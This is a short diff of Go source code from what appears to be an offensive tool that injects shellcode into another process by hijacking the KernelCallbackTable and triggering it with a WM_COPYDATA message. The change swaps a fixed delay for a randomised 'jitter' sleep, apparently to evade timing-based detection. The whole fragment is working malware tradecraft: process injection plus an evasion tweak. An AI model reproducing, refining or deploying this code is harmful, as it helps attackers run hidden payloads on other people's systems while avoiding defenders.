@@ -402,7 +402,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	}()
 	sb.WriteString("[+] Sent WM_COPYDATA message (async)\n")
 
-	time.Sleep(500 * time.Millisecond)
+	jitterSleep(400*time.Millisecond, 700*time.Millisecond)
 
 	// Step 10: Restore original KernelCallbackTable pointer
 	origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
